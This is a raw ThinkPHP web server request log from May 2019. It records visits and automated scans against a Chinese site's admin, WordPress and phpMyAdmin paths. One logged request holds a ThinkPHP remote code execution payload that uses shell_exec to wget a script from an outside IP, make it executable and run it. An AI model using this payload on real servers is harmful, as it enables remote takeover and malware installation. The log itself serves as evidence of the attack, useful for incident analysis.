[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/login_index.php [ array (
) ]
---------------------------------------------------------------
[2019-05-11T14:41:08+08:00] 47.98.96.116 GET csgxjk.com/admin/login/logout.html
[运行时间：0.017468s] [吞吐率：57.25req/s] [内存消耗：2,091.66kb] [文件加载：81]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T14:41:08+08:00] 47.98.96.116 GET csgxjk.com/
[运行时间：0.016404s] [吞吐率：60.96req/s] [内存消耗：1,982.21kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T14:42:36+08:00] 47.100.51.108 GET 39.96.87.22/
[运行时间：0.016795s] [吞吐率：59.54req/s] [内存消耗：1,982.25kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => '39.96.87.22',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T14:49:47+08:00] 120.77.213.254 GET csgxjk.com/admin/login/index.html
[运行时间：0.018723s] [吞吐率：53.41req/s] [内存消耗：2,147.67kb] [文件加载：82]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/login_index.php [ array (
) ]
---------------------------------------------------------------
[2019-05-11T14:54:28+08:00] 106.15.186.63 GET csgxjk.com/admin/admin/index.html
[运行时间：0.018453s] [吞吐率：54.19req/s] [内存消耗：2,155.27kb] [文件加载：81]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T14:54:28+08:00] 106.15.186.63 GET csgxjk.com/admin/login/
[运行时间：0.018128s] [吞吐率：55.16req/s] [内存消耗：2,147.57kb] [文件加载：82]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/login_index.php [ array (
) ]
---------------------------------------------------------------
[2019-05-11T14:56:33+08:00] 47.92.29.149 GET csgxjk.com/admin/user/index.html
[运行时间：0.017850s] [吞吐率：56.02req/s] [内存消耗：2,142.26kb] [文件加载：81]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T14:56:33+08:00] 47.92.29.149 GET csgxjk.com/admin/login/
[运行时间：0.017378s] [吞吐率：57.54req/s] [内存消耗：2,147.57kb] [文件加载：82]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/login_index.php [ array (
) ]
---------------------------------------------------------------
[2019-05-11T14:56:52+08:00] 47.100.57.133 GET csgxjk.com/admin/index/index.html
[运行时间：0.018596s] [吞吐率：53.77req/s] [内存消耗：2,154.59kb] [文件加载：83]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/index_index.php [ array (
  0 => 'userinfo',
  1 => 'menu',
) ]
---------------------------------------------------------------
[2019-05-11T15:01:48+08:00] 106.15.186.63 GET csgxjk.com/admin/login/
[运行时间：0.018836s] [吞吐率：53.09req/s] [内存消耗：2,147.57kb] [文件加载：82]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/login_index.php [ array (
) ]
---------------------------------------------------------------
[2019-05-11T15:08:13+08:00] 47.92.98.215 GET csgxjk.com/admin/setmeal/index.html
[运行时间：0.017080s] [吞吐率：58.55req/s] [内存消耗：2,145.47kb] [文件加载：81]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T15:08:13+08:00] 47.92.98.215 GET csgxjk.com/admin/login/
[运行时间：0.018221s] [吞吐率：54.88req/s] [内存消耗：2,147.57kb] [文件加载：82]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/login_index.php [ array (
) ]
---------------------------------------------------------------
[2019-05-11T15:11:16+08:00] 95.213.177.124 POST check.proxyradar.com/azenv.php?auth=155755867643&a=PSCN&i=660625174&p=80
[运行时间：0.014265s] [吞吐率：70.10req/s] [内存消耗：1,729.46kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T15:24:01+08:00] 101.132.177.14 GET www.csgxjk.com/admin/role/index.html
[运行时间：0.018088s] [吞吐率：55.29req/s] [内存消耗：2,159.60kb] [文件加载：81]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'www.csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T15:24:01+08:00] 101.132.177.14 GET www.csgxjk.com/admin/login/
[运行时间：0.018312s] [吞吐率：54.61req/s] [内存消耗：2,147.60kb] [文件加载：82]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'www.csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/login_index.php [ array (
) ]
---------------------------------------------------------------
[2019-05-11T15:41:32+08:00] 120.76.41.9 GET www.csgxjk.com/
[运行时间：0.017010s] [吞吐率：58.79req/s] [内存消耗：1,982.24kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip,deflate',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36',
  'host' => 'www.csgxjk.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T15:43:04+08:00] 219.90.92.226 GET 39.96.87.22:80/
[运行时间：0.015841s] [吞吐率：63.13req/s] [内存消耗：1,982.07kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T15:57:01+08:00] 120.79.217.140 GET csgxjk.com/admin/role/authtree.html?roleid=1
[运行时间：0.018403s] [吞吐率：54.34req/s] [内存消耗：2,159.95kb] [文件加载：81]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'roleid' => '1',
)
---------------------------------------------------------------
[2019-05-11T15:57:01+08:00] 120.79.217.140 GET csgxjk.com/admin/login/
[运行时间：0.017676s] [吞吐率：56.57req/s] [内存消耗：2,147.57kb] [文件加载：82]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/login_index.php [ array (
) ]
---------------------------------------------------------------
[2019-05-11T16:02:16+08:00] 120.79.206.221 GET csgxjk.com/admin/log/index.html
[运行时间：0.017713s] [吞吐率：56.46req/s] [内存消耗：2,141.55kb] [文件加载：81]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T16:02:16+08:00] 120.79.206.221 GET csgxjk.com/admin/login/
[运行时间：0.018610s] [吞吐率：53.73req/s] [内存消耗：2,147.57kb] [文件加载：82]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:36.0) Gecko/20100101 Firefox/36.0',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/login_index.php [ array (
) ]
---------------------------------------------------------------
[2019-05-11T16:37:07+08:00] 103.84.252.14 GET 39.96.87.22:80/
[运行时间：0.016888s] [吞吐率：59.21req/s] [内存消耗：1,982.07kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T16:50:30+08:00] 182.119.37.208 GET 39.96.87.22/
[运行时间：0.016778s] [吞吐率：59.60req/s] [内存消耗：1,982.70kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cache-control' => 'max-age=259200',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
  'host' => '39.96.87.22',
  'accept-encoding' => 'gzip, deflate',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T16:50:30+08:00] 125.127.30.34 GET 39.96.87.22/explicit_not_exist_path
[运行时间：0.015595s] [吞吐率：64.12req/s] [内存消耗：1,729.66kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T16:50:31+08:00] 183.27.51.253 GET 39.96.87.22/index.html
[运行时间：0.016396s] [吞吐率：60.99req/s] [内存消耗：1,983.46kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cache-control' => 'max-age=259200',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
  'host' => '39.96.87.22',
  'accept-encoding' => 'gzip, deflate',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T16:50:32+08:00] 222.188.216.54 GET 39.96.87.22/index.php
[运行时间：0.016715s] [吞吐率：59.83req/s] [内存消耗：1,982.70kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cache-control' => 'max-age=259200',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
  'host' => '39.96.87.22',
  'accept-encoding' => 'gzip, deflate',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T16:50:32+08:00] 116.2.94.68 GET 39.96.87.22/index.jsp
[运行时间：0.015186s] [吞吐率：65.85req/s] [内存消耗：1,729.66kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T16:50:32+08:00] 183.27.51.102 GET 39.96.87.22/admin/
[运行时间：0.019273s] [吞吐率：51.89req/s] [内存消耗：2,154.94kb] [文件加载：83]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cache-control' => 'max-age=259200',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
  'host' => '39.96.87.22',
  'accept-encoding' => 'gzip, deflate',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ VIEW ] /data/www/csgx2/application/admin/view/index_index.php [ array (
  0 => 'userinfo',
  1 => 'menu',
) ]
---------------------------------------------------------------
[2019-05-11T16:50:34+08:00] 125.127.31.155 GET 39.96.87.22/wp-login.php
[运行时间：0.014714s] [吞吐率：67.96req/s] [内存消耗：1,730.00kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T16:50:34+08:00] 125.115.104.16 GET 39.96.87.22/readme.html
[运行时间：0.014996s] [吞吐率：66.68req/s] [内存消耗：1,730.04kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T16:50:35+08:00] 125.127.29.207 GET 39.96.87.22/license.txt
[运行时间：0.016137s] [吞吐率：61.97req/s] [内存消耗：1,730.00kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T16:50:35+08:00] 203.119.196.123 GET 39.96.87.22/wp-includes/js/wplink.js
[运行时间：0.015574s] [吞吐率：64.21req/s] [内存消耗：1,730.02kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T16:50:35+08:00] 203.119.132.50 GET 39.96.87.22/wp-admin/js/customize-controls.js
[运行时间：0.015522s] [吞吐率：64.42req/s] [内存消耗：1,730.02kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T16:50:35+08:00] 203.119.193.141 GET 39.96.87.22/wp-admin/js/nav-menu.js
[运行时间：0.016489s] [吞吐率：60.65req/s] [内存消耗：1,730.01kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T16:50:35+08:00] 203.119.135.114 GET 39.96.87.22/wp-includes/js/plupload/handlers.js
[运行时间：0.015445s] [吞吐率：64.75req/s] [内存消耗：1,730.02kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T16:50:35+08:00] 124.92.138.6 GET 39.96.87.22/wp-includes/js/tinymce/wp-tinymce.js.gz
[运行时间：0.015638s] [吞吐率：63.95req/s] [内存消耗：1,730.02kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T16:50:36+08:00] 222.137.31.21 GET 39.96.87.22/4e5e5d7364f443e28fbf0d3ae744a59a
[运行时间：0.015261s] [吞吐率：65.53req/s] [内存消耗：1,730.02kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T16:50:36+08:00] 124.92.133.161 GET 39.96.87.22/?c=4e5e5d7364f443e28fbf0d3ae744a59a
[运行时间：0.016032s] [吞吐率：62.38req/s] [内存消耗：1,984.15kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'cache-control' => 'max-age=259200',
  'cookie' => 'ASPSESSIONID=6034ips687pbqndtcp874rgr1h',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36',
  'host' => '39.96.87.22',
  'accept-encoding' => 'gzip, deflate',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'c' => '4e5e5d7364f443e28fbf0d3ae744a59a',
)
---------------------------------------------------------------
[2019-05-11T16:50:36+08:00] 182.119.36.37 GET 39.96.87.22/index.php/explicit_not_exist_path
[运行时间：0.014709s] [吞吐率：67.99req/s] [内存消耗：1,730.02kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T16:50:37+08:00] 180.104.195.250 GET 39.96.87.22/wcm/
[运行时间：0.014527s] [吞吐率：68.84req/s] [内存消耗：1,729.99kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T16:50:37+08:00] 182.121.66.83 GET 39.96.87.22/phpMyAdmin/
[运行时间：0.015106s] [吞吐率：66.20req/s] [内存消耗：1,730.00kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T16:50:37+08:00] 125.127.25.239 GET 39.96.87.22/phpmyadmin/
[运行时间：0.015608s] [吞吐率：64.07req/s] [内存消耗：1,730.00kb] [文件加载：67]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T16:59:25+08:00] 42.112.30.39 GET csgxjk.com/wp/wp-login.php
[运行时间：0.015206s] [吞吐率：65.76req/s] [内存消耗：1,707.47kb] [文件加载：66]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T17:21:28+08:00] 182.92.240.15 GET 39.96.87.22/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://81.6.42.123/a_thk.sh%20-O%20/tmp/a;%20chmod%200777%20/tmp/a;%20/tmp/a;
[运行时间：0.014495s] [吞吐率：68.99req/s] [内存消耗：1,707.83kb] [文件加载：66]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
[2019-05-11T17:26:08+08:00] 120.204.209.28 GET www.csgxjk.com/
[运行时间：0.016539s] [吞吐率：60.46req/s] [内存消耗：1,983.44kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-CN,zh;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36',
  'upgrade-insecure-requests' => '1',
  'connection' => 'keep-alive',
  'host' => 'www.csgxjk.com',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T17:49:57+08:00] 89.248.169.12 GET 80/
[运行时间：0.015740s] [吞吐率：63.53req/s] [内存消耗：1,981.77kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'user-agent' => 'Mozilla/5.0 zgrab/0.x',
  'host' => '80',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T18:29:17+08:00] 109.242.235.69 GET 39.96.87.22:80/
[运行时间：0.016496s] [吞吐率：60.62req/s] [内存消耗：1,982.07kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '39.96.87.22:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T18:45:43+08:00] 47.97.220.124 GET csgxjk.com/
[运行时间：0.016239s] [吞吐率：61.58req/s] [内存消耗：1,982.02kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => 'csgxjk.com',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D))',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T18:54:09+08:00] 116.62.215.53 GET 39.96.87.22/
[运行时间：0.016605s] [吞吐率：60.22req/s] [内存消耗：1,982.06kb] [文件加载：70]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept' => 'text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2',
  'host' => '39.96.87.22',
  'user-agent' => 'Mozilla/5.0 (Linux; Android 4.1.1; Nexus 7 Build/JRO03D))',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
---------------------------------------------------------------
[2019-05-11T19:18:33+08:00] 167.98.65.183 GET csgxjk.com/wordpress/wp-login.php
[运行时间：0.015031s] [吞吐率：66.53req/s] [内存消耗：1,707.48kb] [文件加载：66]
[ info ] [ LANG ] /data/www/csgx2/thinkphp/lang/zh-cn.php
---------------------------------------------------------------
